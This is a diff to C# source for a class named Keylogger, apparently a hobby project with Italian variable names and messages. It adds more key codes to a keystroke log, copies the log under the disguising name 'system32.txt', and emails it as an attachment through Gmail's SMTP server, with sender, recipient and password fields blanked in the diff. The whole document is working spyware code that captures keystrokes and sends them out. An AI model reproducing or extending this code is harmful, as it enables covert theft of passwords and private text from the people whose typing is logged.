@@ -73,6 +73,16 @@ class Keylogger
             using (StreamWriter sw = File.AppendText(path))
             {
                 if (vkCode == 32) sw.Write(" ");
+                else if (vkCode == 48) sw.Write("0");
+                else if (vkCode == 64) sw.Write("@");
+                else if (vkCode == 50) sw.Write("2");
+                else if (vkCode == 51) sw.Write("3");
+                else if (vkCode == 52) sw.Write("4");
+                else if (vkCode == 53) sw.Write("5");
+                else if (vkCode == 54) sw.Write("6");
+                else if (vkCode == 55) sw.Write("7");
+                else if (vkCode == 56) sw.Write("8");
+                else if (vkCode == 57) sw.Write("9");
                 else if (vkCode == 186) sw.Write("è");
                 else if (vkCode == 222) sw.Write("à");
                 else if (vkCode == 221) sw.Write("ì");
@@ -80,7 +90,7 @@ class Keylogger
                 else if (vkCode == 192) sw.Write("ò");
                 else if (vkCode == 13) sw.Write("\n");
                 else if (vkCode == 219) sw.Write("?");
-                else if (vkCode == 49) sw.Write("!");
+                else if (vkCode == 49) sw.Write("!/1");
                 else if (vkCode == 65) sw.Write("a");
                 else if (vkCode == 66) sw.Write("b");
                 else if (vkCode == 67) sw.Write("c");
@@ -173,8 +183,8 @@ class Keylogger
         string filePath1 = folderName + @"\system32.txt";
         System.IO.File.Copy(filePath, filePath1, true);
 
-        String mittente= "aaa@gmail.com";
-        String destinatario = "bbb@gmail.com";
+        String mittente= "";
+        String destinatario = "";
         SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
         MailMessage mailMessage = new MailMessage();
         mailMessage.From = new MailAddress(mittente);
@@ -182,7 +192,7 @@ class Keylogger
         mailMessage.Subject = "Output KeyLogger";
         client.UseDefaultCredentials = false;
         client.EnableSsl = true;
-        client.Credentials = new System.Net.NetworkCredential("aaa@gmail.com", "boh");
+        client.Credentials = new System.Net.NetworkCredential("", "");
         mailMessage.Body = "Hi! Ecco qua il file di testo :D\n";
         mailMessage.Attachments.Add(new Attachment(filePath1));
         client.Send(mailMessage);
